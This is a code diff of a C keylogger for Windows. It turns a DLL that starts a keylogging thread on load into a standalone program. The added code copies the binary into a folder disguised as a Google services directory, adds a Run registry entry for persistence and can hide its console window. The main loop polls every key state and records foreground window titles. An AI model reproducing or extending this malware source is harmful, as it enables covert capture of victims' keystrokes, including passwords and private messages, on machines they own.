@@ -150,6 +150,82 @@ void handleKeyRelease(int key) {
         ctrlPressed = 0;
 }
 
+void create_directory(char *targetPath) {
+    if (!targetPath) return;
+    
+    struct stat st = {0};
+    if (stat(targetPath, &st) == -1) {
+        if (_mkdir(targetPath) == 0) {
+            printf("Directory created successfully: %s\n", targetPath);
+        } else {
+            perror("Failed to create directory");
+        }
+    } else {
+        printf("Directory already exists: %s\n", targetPath);
+    }
+}
+
+void copyToSystemLocation(char *targetPath) {
+    if (!targetPath) return;
+    
+    char username[256];
+    DWORD username_len = sizeof(username);
+
+    if (!GetUserName(username, &username_len)) {
+        printf("Failed to get username. Error code: %lu\n", GetLastError());
+        return;
+    }
+   
+    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services", username) >= MAX_PATH) {
+        printf("Path length exceeds MAX_PATH limit.\n");
+        return;
+    }
+
+    create_directory(targetPath);
+
+    if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWFILE) >= MAX_PATH) {
+        printf("Path length exceeds MAX_PATH limit.\n");
+        return;
+    }
+
+    if (access(targetPath, F_OK) != -1) {
+        printf("File already exists at target location: %s\n", targetPath);
+        return;
+    }
+    
+    if (!CopyFile(OLDFILE, targetPath, FALSE)) {
+        DWORD dwError = GetLastError();
+        printf("Error copying file. Error code: %lu\n", dwError);
+    } else {
+        printf("File copied successfully to: %s\n", targetPath);
+    }
+}
+
+void setRegistryPersistence(const char *targetPath) {
+    if (!targetPath) return;
+    
+    HKEY hKey;
+    LONG result = RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+    if (result == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, REGISTERY_NAME, 0, REG_SZ, (LPBYTE)targetPath, (DWORD)(strlen(targetPath) + 1));
+        RegCloseKey(hKey);
+        printf("Registry persistence set for: %s\n", targetPath);
+    } else {
+        printf("Failed to open registry key. Error code: %lu\n", GetLastError());
+    }
+}
+
+void persistence() {
+    char targetPath[MAX_PATH];
+    copyToSystemLocation(targetPath); 
+    setRegistryPersistence(targetPath); 
+}
+
+void hideConsole() {
+    HWND stealth = GetConsoleWindow();
+    ShowWindow(stealth, SW_HIDE);
+}
+
 void updateWindowTitle() {
     static char lastWindowTitle[WINDOW_TITLE_BUFFER_SIZE] = {0};
     HWND currentWindow = GetForegroundWindow();
@@ -167,14 +243,17 @@ void updateWindowTitle() {
     }
 }
 
-
-DWORD WINAPI KeyloggerThread(LPVOID lpParameter) {
+int main() {
+    // hideConsole();
+    persistence();
 
     int keyStates[KEY_CODE_MAX] = {0};
 
     while (1) {
         updateWindowTitle();
+
         Sleep(SLEEP_INTERVAL_MS);
+
         for (int key = KEY_CODE_MIN; key < KEY_CODE_MAX; key++) {
             SHORT keyState = GetAsyncKeyState(key);
             if (keyState & KEY_PRESSED) {
@@ -191,20 +270,4 @@ DWORD WINAPI KeyloggerThread(LPVOID lpParameter) {
         }
     }
     return 0;
-}
-
-/* DLL Entry Point */
-BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    HANDLE hThread;
-    switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
-            DisableThreadLibraryCalls(hinstDLL);
-            hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
-            if (hThread)
-                CloseHandle(hThread);
-            break;
-        case DLL_PROCESS_DETACH:
-            break;
-    }
-    return TRUE;
 }
